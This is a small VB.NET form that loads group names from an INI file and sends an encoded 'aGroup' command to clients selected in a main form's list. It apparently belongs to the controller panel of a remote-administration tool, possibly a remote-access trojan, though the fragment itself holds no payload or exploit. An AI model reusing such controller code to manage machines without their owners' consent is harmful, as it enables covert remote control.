﻿Public Class multi
    Private Sub multi_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        For Each a As String In IO.File.ReadAllLines("Groups.ini")
            Lv1.Items.Add(a.Replace("<Group>", "").Replace("</Group>", ""))
        Next
    End Sub

    Private Sub Lv1_DoubleClick(sender As Object, e As EventArgs) Handles Lv1.DoubleClick
        For Each x As ListViewItem In Form1.L1.SelectedItems
            Form1.S.Send(x.Tag, Form1.ENB("aGroup") & Form1.Y & Me.Lv1.SelectedIndices(0))
        Next
    End Sub
End Class